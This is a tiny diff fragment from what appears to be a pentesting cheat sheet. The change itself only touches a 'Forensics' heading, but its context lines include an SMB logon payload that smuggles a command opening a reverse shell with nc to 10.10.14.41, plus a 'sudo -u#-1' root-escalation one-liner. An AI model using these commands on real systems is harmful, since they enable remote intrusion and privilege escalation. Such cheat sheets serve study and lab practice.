@@ -2713,7 +2713,7 @@ smb: \> logon "/=`nohup mkfifo /tmp/manununu; nc 10.10.14.41 2222 0</tmp/manunun
 sudo -u#-1 /bin/bash
 ```
 
-# Forensics
+# Forensics
 ## Memory Analysis
 ### msfpescan
 * Search for jump equivalent instruction
